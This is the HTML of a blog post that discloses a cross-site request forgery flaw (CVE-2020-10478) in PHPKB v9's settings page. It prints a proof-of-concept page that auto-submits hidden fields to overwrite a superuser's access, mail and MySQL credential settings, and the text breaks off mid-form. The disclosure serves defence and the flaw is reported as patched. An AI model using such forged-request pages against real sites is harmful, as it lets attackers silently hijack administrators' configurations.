<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Analyzing PHPKB v9: Part three | Antonio Cannito</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="Analyzing PHPKB v9: Part three" />
<meta name="author" content="Antonio" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="The third part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Cross-Site Request Forgery." />
<meta property="og:description" content="The third part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Cross-Site Request Forgery." />
<link rel="canonical" href="https://antoniocannito.it/phpkb3" />
<meta property="og:url" content="https://antoniocannito.it/phpkb3" />
<meta property="og:site_name" content="Antonio Cannito" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-04-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Analyzing PHPKB v9: Part three" />
<script type="application/ld+json">
{"description":"The third part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Cross-Site Request Forgery.","url":"https://antoniocannito.it/phpkb3","@type":"BlogPosting","headline":"Analyzing PHPKB v9: Part three","dateModified":"2019-04-05T00:00:00+00:00","datePublished":"2019-04-05T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://antoniocannito.it/phpkb3"},"author":{"@type":"Person","name":"Antonio"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="https://antoniocannito.it/feed.xml" title="Antonio Cannito" />

  <!-- Google Analytics-->
  
  <script>
  window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
  ga('create', 'UA—XXXXXXXX-X', 'auto');
  ga('send', 'pageview');
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">Antonio Cannito</h2>
    </a>
    <ul>
      <li><a href="/">Home</a></li>
      <li><a href="https://it.linkedin.com/in/antonio-cannito">Linkedin</a></li>
            <li><a href="https://github.com/nitokhantonio">Github</a></li>
      <li><a href="/pgp/">PGP Key</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post">
  <div class="post-info">
    <span>Written by</span>
    
        Antonio
    

    
      <br>
      <span>on&nbsp;</span><time datetime="2019-04-05 00:00:00 +0000">April 05, 2019</time>
    
  </div>

  <h1 class="post-title">Analyzing PHPKB v9: Part three</h1>
  <div class="post-line"></div>

  <p>This article has been split into three parts; other parts can be found below:</p>

<p>Part 1: <a href="/phpkb1">Part 1</a></p>

<p>Part 2: <a href="/phpkb2">Part 2</a></p>

<p>UPDATE: the vulnerabilities have been fixed in PHPKB v9 P1-202005.</p>

<h2 id="cross-site-request-forgery-when-changing-settings-cve-2020-10478">Cross-Site Request Forgery when changing settings (CVE-2020-10478)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-settings.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tools” and click on “manage settings”;</li>
  <li>click on “save settings”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/manage-settings.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kbname"</span> <span class="na">value=</span><span class="s">"test"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kburl"</span> <span class="na">value=</span><span class="s">"[PHPKB]"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;access"</span> <span class="na">value=</span><span class="s">"unrestricted"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"extended&amp;#95;support&amp;#95;license&amp;#95;key"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mail&amp;#95;server"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;hostname"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;username"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;password"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;port"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"encryption&amp;#95;method"</span> <span class="na">value=</span><span class="s">"None"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"emails&amp;#95;debug&amp;#95;mode"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"emails&amp;#95;debug&amp;#95;output"</span> <span class="na">value=</span><span class="s">"error&amp;#95;log"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"send&amp;#95;mails&amp;#95;from"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"test&amp;#95;email"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqlserver"</span> <span class="na">value=</span><span class="s">"127&amp;#46;0&amp;#46;0&amp;#46;1"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqlusername"</span> <span class="na">value=</span><span class="s">"root"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqlpswd"</span> <span class="na">value=</span><span class="s">"DummyPass"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqldatabase"</span> <span class="na">value=</span><span class="s">"test"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"fluid"</span> <span class="nt">/&gt;</span>
